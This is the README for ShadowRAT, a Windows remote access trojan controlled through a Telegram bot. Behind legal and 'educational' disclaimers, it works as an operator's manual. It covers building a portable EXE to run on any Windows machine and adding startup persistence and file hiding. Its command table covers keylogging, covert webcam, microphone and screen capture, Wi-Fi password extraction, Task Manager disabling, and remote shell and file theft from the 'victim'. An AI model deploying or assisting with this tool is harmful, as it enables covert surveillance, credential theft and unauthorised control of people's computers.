# ShadowRAT

**A Telegram-based Remote Access Trojan for Windows**

ShadowRAT is a Remote Access Trojan that uses Telegram as its command and control (C2) channel. It provides complete remote control over a Windows machine through Telegram bot commands with password authentication.

---

## SECURITY RESEARCH & EDUCATIONAL PURPOSE NOTICE

**ShadowRAT is developed STRICTLY for security research, authorized penetration testing, and cybersecurity education purposes ONLY.**

This tool demonstrates how Remote Access Trojans (RATs) operate using Telegram as a Command and Control (C2) channel. The project is designed to help:

- **Cybersecurity Professionals** - Understand RAT mechanics and detection methods
- **Security Researchers** - Analyze malware behavior and C2 communication patterns
- **Penetration Testers** - Conduct authorized security assessments
- **Students & Educators** - Study remote administration tool capabilities and risks

By studying this tool, security practitioners can:
- Identify malicious RAT behavior in network traffic
- Develop better detection signatures
- Understand attacker techniques
- Improve defensive security measures
- Create effective incident response procedures

**This project exists to promote cybersecurity awareness and strengthen defenses against real-world threats. It is NOT intended for malicious use.**

---

## LEGAL DISCLAIMER - READ CAREFULLY

**BY USING, DOWNLOADING, OR ACCESSING THIS SOFTWARE, YOU ACKNOWLEDGE AND AGREE TO THE FOLLOWING:**

### 1. Authorized Use Only
This tool is authorized for use **EXCLUSIVELY** in the following scenarios:
- Systems you personally own
- Systems where you have **written permission** from the owner
- Isolated laboratory environments (Virtual Machines)
- Educational demonstrations where NO unauthorized access occurs

### 2. Prohibited Activities - DO NOT USE FOR:
- Unauthorized access to any computer system, network, or device
- Stealing passwords, personal information, or banking data
- Stealing company secrets or trade secrets
- Harassment, stalking, or invading someone's privacy
- Any activity that violates local, state, federal, or international laws
- Any activity that violates Telegram Terms of Service
- Any activity that could cause harm to systems or users

### 3. Legal Compliance
You are **SOLELY RESPONSIBLE FOR**:
- Understanding and following all applicable laws in your country
- Getting proper permission before any testing
- Ensuring your use does not violate any computer misuse laws
- Any legal consequences resulting from your use or misuse of this tool

### 4. Liability Waiver
**THE DEVELOPER IS NOT RESPONSIBLE FOR:**
- Any damages caused by this software
- Loss of data, money, or reputation
- Legal penalties, fines, or criminal charges
- Any consequences from authorized or unauthorized use
- Misuse by anyone who uses this tool

**YOU AGREE THAT THE DEVELOPER HAS NO LIABILITY FOR ANY CLAIMS ARISING FROM YOUR USE OF THIS SOFTWARE.**

### 5. Warranty Disclaimer
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. THE DEVELOPER MAKES NO GUARANTEES ABOUT THE SUITABILITY, RELIABILITY, OR ACCURACY OF THIS SOFTWARE.

### 6. Violation Consequences
Violation of these terms may result in:
- Immediate ban from using this software
- Reporting illegal activities to law enforcement
- Legal action under computer crime laws

---

## Responsible Use

If you find security issues in this tool, please report them through GitHub issues.

## Final Warning

**THIS TOOL CAN CAUSE SERIOUS HARM IF MISUSED. UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS A SERIOUS CRIME THAT CAN RESULT IN:**

- Prison time
- Heavy fines
- Permanent criminal record
- Lawsuits for damages

**IF YOU DO NOT UNDERSTAND OR AGREE WITH THESE TERMS, DO NOT DOWNLOAD, INSTALL, OR USE THIS SOFTWARE.**

---

## Repository Purpose Statement

This repository is for **defensive security research purposes only**. The code is publicly available to:

1. Teach security professionals about RAT capabilities
2. Enable research into detection and prevention methods
3. Show how Telegram-based C2 communication works
4. Provide training material for cybersecurity courses

The developer does NOT support using this tool for any malicious purposes and keeps this repository only for academic and defensive security research.

---

**By using ShadowRAT, you confirm that you have read, understood, and agreed to all terms above. You confirm that your use will be legal, authorized, and follow this disclaimer.**

---

## Features

### Authentication
- Password-protected access
- Session-based user authentication

### Keylogger
- Real-time keystroke logging
- Captures all keyboard input including special keys
- Automatic log buffering and saving

### System Control
- Remote shutdown, restart, and sleep
- Input blocking/unblocking
- Task Manager enable/disable
- Windows startup persistence
- Alt+F4 simulation
- CMD flood (10 windows)

### Surveillance
- Live screenshot capture
- Screen recording
- Webcam photo capture
- Webcam video recording
- Microphone audio recording

### Information Gathering
- Wi-Fi network list and password extraction
- System information (OS, CPU, RAM)
- Process list and process killing
- User account enumeration
- Installed applications list
- Battery status
- IP address and geolocation

### File Operations
- Upload files to target machine
- Download files from target machine
- Execute files remotely
- File metadata viewing

### Remote Command Execution
- Single command execution with output
- Batch command execution with long output
- Interactive shell session
- Directory navigation (cd)

### Input Simulation
- Keyboard typing simulation
- Single, dual, and triple keypress
- Mouse movement to coordinates
- Mouse left/right click
- Random mouse movement (Mouse Mess)

### Browser Control
- Open URLs in Chrome
- Open URLs in Edge
- Open URLs in Firefox

### Audio/Visual
- Text-to-speech
- Sound file playback
- Volume control (max, +10, -10)

### Window Management
- Maximize active window
- Minimize active window

### Clipboard
- Read clipboard contents
- Write to clipboard

### Obfuscation
- Hide script file
- Unhide script file

### MessageBox
- Custom message box with different types (info, warning, error, question)

### Wallpaper
- Change desktop wallpaper remotely

## Installation

### What You Need Before Starting

- **Windows Computer** - This tool only works on Windows
- **Python 3.13 or newer** - Download from python.org
- **Telegram Bot Token** - Get it free from @BotFather on Telegram
- **Internet Connection** - Required for bot communication

### Get a Telegram Bot Token (Simple Steps)

1. Open Telegram app on your phone or computer

2. Search for `@BotFather`

3. Send `/newbot` to BotFather

4. Give your bot a name (example: `ShadowRAT`)

5. Give your bot a username (must end with 'bot', example: `ShadowRAT_bot`)

6. BotFather will give you a token (looks like: `7234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw`)

7. **Copy and save this token** - You will need it later

### Clone This Repository

Open Command Prompt and type:

```bash
git clone https://github.com/s-r-e-e-r-a-j/ShadowRAT.git
```
### Navigate to the ShadowRAT directory
```bash
cd ShadowRAT
```
### Install Required Packages
Copy and paste this command in Command Prompt:

```bash
pip install pyautogui opencv-python pyttsx3 numpy pynput requests pytelegrambotapi pillow wave pyaudio 
```

If PyAudio gives an error, try these commands instead:

```bash
pip install pipwin
pipwin install pyaudio
```

### Set Up Your Bot Token
1. Open `shadow_rat.py` with Notepad or any text editor

2. Find this line:

```python
BOT_TOKEN: str = 'YOUR_BOT_TOKEN_HERE'
```

3. Replace `YOUR_BOT_TOKEN_HERE` with the token you got from BotFather

4. Save the file

### Change Password (Optional but Recommended)
1. In the same file, find this line:

```python
PASSWORD: str = '1234567B'
```
2. Change `1234567B` to your own secret password.

### Run the Tool (Two Ways)

**Way 1 - Run as Python Script:**
```bash
python shadow_rat.py
```
**Way 2 - Build as EXE File (No Python Needed):**

*First, install PyInstaller:*
```bash
pip install pyinstaller
```
*Then run the builder script:*

```bash
python build_rat.py
```
Select option `3` (Full rebuild). The EXE file will be in the `dist` folder as `SHADOW_RAT.exe`.

You can copy this single EXE file to any Windows computer and run it without installing Python.


## Bot Commands

### How to Use

1. Open Telegram and search for your bot username (example: `@ShadowRAT_bot`)
  
2. Send `/start` to the bot

3. Bot asks for password - send `1234567B` (or your custom password)
  
4. Bot replies: `SHADOW RAT Activated` and shows victim info

5. Send any command from the list below

### Authentication
| Command | Description |
|---------|-------------|
| `/start` | Connect to RAT |
| `/help` | Show this help menu |

### System Control
| Command | Description |
|---------|-------------|
| `/addstartup` | Add to Windows startup |
| `/deletestartup` | Remove from Windows startup |
| `/run [path]` | Run a file |
| `/sleep` | Put computer to sleep |
| `/shutdown` | Shutdown computer |
| `/restart` | Restart computer |
| `/altf4` | Send Alt+F4 command |
| `/cmdbomb` | Open 10 CMD windows |
| `/block` | Block keyboard and mouse input |
| `/unblock` | Unblock keyboard and mouse input |
| `/disabletaskmgr` | Disable Task Manager |
| `/enabletaskmgr` | Enable Task Manager |

### Keylogger
| Command | Description |
|---------|-------------|
| `/keylogstart` | Start keylogger |
| `/keylogstop` | Stop keylogger |
| `/keylogdump` | Download keylog file |

### Surveillance
| Command | Description |
|---------|-------------|
| `/screenshot` | Take screenshot |
| `/mic [sec]` | Record microphone (default 5 sec) |
| `/webscreen` | Take webcam photo |
| `/webcam [sec]` | Record webcam video (default 5 sec) |
| `/screenrecord [sec]` | Record screen (default 10 sec) |

### Information Gathering
| Command | Description |
|---------|-------------|
| `/users` | Show all PC users |
| `/whoami` | Show current username |
| `/tasklist` | Show running processes |
| `/taskkill [name]` | Kill a process by name |
| `/wifilist` | Show saved Wi-Fi networks |
| `/wifipass [name]` | Show Wi-Fi password |
| `/info` | Show IP address and location |
| `/pcinfo` | Show detailed system info |
| `/shortinfo` | Show basic system info |
| `/apps` | Show installed applications |
| `/batteryinfo` | Show battery status |

### File Operations
| Command | Description |
|---------|-------------|
| `/download [path]` | Download file from victim |
| `/upload` | Upload file to victim |
| `/metadata [path]` | Show file metadata |

### Command Execution
| Command | Description |
|---------|-------------|
| `/e [cmd]` | Execute command with output |
| `/ex [cmd]` | Execute command (long output as file) |
| `/execute` | Start interactive shell session |

### Input Simulation
| Command | Description |
|---------|-------------|
| `/keytype [text]` | Type text |
| `/keypress [key]` | Press a single key |
| `/keypresstwo k1 k2` | Press two keys together |
| `/keypressthree k1 k2 k3` | Press three keys together |
| `/mousemove x y` | Move mouse to coordinates |
| `/mouseclick` | Left click at current position |
| `/mouseright` | Right click at current position |
| `/mousemesstart` | Start random mouse movement |
| `/mousemesstop` | Stop random mouse movement |

### Audio Control
| Command | Description |
|---------|-------------|
| `/textspeech [text]` | Convert text to speech |
| `/playsound [path]` | Play a sound file |
| `/fullvolume` | Set volume to maximum |
| `/volumeplus` | Increase volume by 10% |
| `/volumeminus` | Decrease volume by 10% |

### Window Control
| Command | Description |
|---------|-------------|
| `/maximize` | Maximize active window |
| `/minimize` | Minimize active window |

### Clipboard
| Command | Description |
|---------|-------------|
| `/clipboard` | Show clipboard contents |
| `/changeclipboard [text]` | Change clipboard contents |

### Browser
| Command | Description |
|---------|-------------|
| `/chrome [url]` | Open URL in Chrome |
| `/edge [url]` | Open URL in Edge |
| `/firefox [url]` | Open URL in Firefox |

### Obfuscation
| Command | Description |
|---------|-------------|
| `/hide` | Hide script file |
| `/unhide` | Unhide script file |

### Other
| Command | Description |
|---------|-------------|
| `/msg [type] [title] [text]` | Show message box (types: info, warning, error, question) |
| `/wallpaper` | Change desktop wallpaper |
| `/metadata [path]` | Show file metadata |
